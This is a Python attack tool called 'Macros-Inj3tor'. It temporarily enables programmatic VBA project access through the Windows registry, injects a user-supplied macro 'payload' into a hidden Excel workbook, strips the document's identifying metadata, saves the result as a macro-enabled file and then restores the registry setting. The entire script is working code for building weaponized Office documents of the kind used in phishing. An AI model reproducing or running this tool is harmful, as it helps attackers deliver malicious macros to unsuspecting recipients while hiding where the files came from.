# Author: Pari Malam

import os
import argparse
import win32com.client
import winreg
from sys import stdout
from colorama import Fore

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"███╗   ███╗ █████╗  ██████╗██████╗  ██████╗ ███████╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔████╔██║███████║██║     ██████╔╝██║   ██║███████╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║╚██╔╝██║██╔══██║██║     ██╔══██╗██║   ██║╚════██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║╚██████╔╝███████║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝\n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n")
    print(f"{Fore.YELLOW}[Macros-Inj3tor] - {Fore.GREEN}You will know this!\n{Fore.RESET}")
banners()

def enable_vbom(version):
    key_val = "Software\\Microsoft\\Office\\" + version + "\\Excel\\Security"
    registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_val)
    winreg.SetValueEx(registry_key, "AccessVBOM", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(registry_key)

def disable_vbom(version):
    key_val = "Software\\Microsoft\\Office\\" + version + "\\Excel\\Security"
    registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_val)
    winreg.SetValueEx(registry_key, "AccessVBOM", 0, winreg.REG_DWORD, 0)
    winreg.CloseKey(registry_key)

def excel_macro(macro_path, output):
    try:
        objExcel = win32com.client.Dispatch("Excel.Application")
        version = objExcel.Application.Version
        objExcel.Application.Quit()
        del objExcel

        enable_vbom(version)

        with open(macro_path, "r") as macro_file:
            macro = macro_file.read()

        excel = win32com.client.Dispatch("Excel.Application")
        excel.Visible = False
        workbook = excel.Workbooks.Add()
        excel_module = workbook.VBProject.VBComponents("ThisWorkbook")
        excel_module.CodeModule.AddFromString(macro)
        excel.DisplayAlerts = False
        xlRDIAll = 99
        workbook.RemoveDocumentInformation(xlRDIAll)
        workbook.SaveAs(output, FileFormat=52)
        excel.Workbooks(1).Close(SaveChanges=1)
        excel.Application.Quit()
        del excel

        disable_vbom(version)
    except Exception as e:
        print(f"An error occurred: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="Run Excel macro")
    parser.add_argument("-p", "--payload", help="Path to the macro file")
    parser.add_argument("-o", "--output", help="Path to the Excel output file")
    args = parser.parse_args()

    if args.payload and args.output:
        excel_macro(args.payload, args.output)
    else:
        print("Both --payload and --output arguments are required.")

if __name__ == "__main__":
    main()
